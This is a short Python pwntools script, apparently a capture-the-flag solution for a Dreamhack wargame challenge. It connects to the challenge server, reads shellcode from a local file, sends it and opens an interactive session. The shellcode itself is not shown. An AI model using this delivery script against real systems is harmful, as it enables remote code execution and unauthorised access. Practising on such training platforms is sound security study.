#!/usr/bin/python3

from pwn import *

p = remote("host1.dreamhack.games", 18398)

with open("./shellcode.txt", "r") as f:
    text = f.read()
    shellcode = text.replace(" ", "")


p.sendline(shellcode)

p.interactive()
